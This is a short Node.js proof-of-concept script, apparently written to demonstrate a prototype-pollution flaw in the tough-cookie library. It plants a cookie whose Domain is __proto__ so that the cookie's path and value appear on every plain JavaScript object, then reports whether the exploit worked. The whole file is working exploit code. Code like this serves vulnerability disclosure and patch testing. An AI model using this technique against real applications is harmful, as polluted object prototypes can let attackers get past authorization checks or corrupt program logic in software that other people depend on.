// index.js
async function main() {
    var tough = require("tough-cookie");
    var cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });

    // Wrapping setCookie in a promise
    async function setCookiePromise(cookieJar, cookieStr, currentUrl) {
        return new Promise((resolve, reject) => {
            cookieJar.setCookie(cookieStr, currentUrl, {}, (err, cookie) => {
                if (err) reject(err);
                else resolve(cookie);
            });
        });
    }

    // Exploit cookie
    try {
        await setCookiePromise(
            cookiejar,
            "Slonser=polluted; Domain=__proto__; Path=/notauth",
            "https://__proto__/admin"
        );
    } catch (err) {
        console.error("Error setting exploit cookie:", err);
    }

    // Normal cookie
    try {
        await setCookiePromise(
            cookiejar,
            "Auth=Lol; Domain=google.com; Path=/notauth",
            "https://google.com/"
        );
    } catch (err) {
        console.error("Error setting normal cookie:", err);
    }

    // Checking for prototype pollution
    var a = {};
    if (a["/notauth"] && a["/notauth"]["Slonser"]) {
        console.log("EXPLOITED SUCCESSFULLY");
    } else {
        console.log("EXPLOIT FAILED");
    }
}

main();
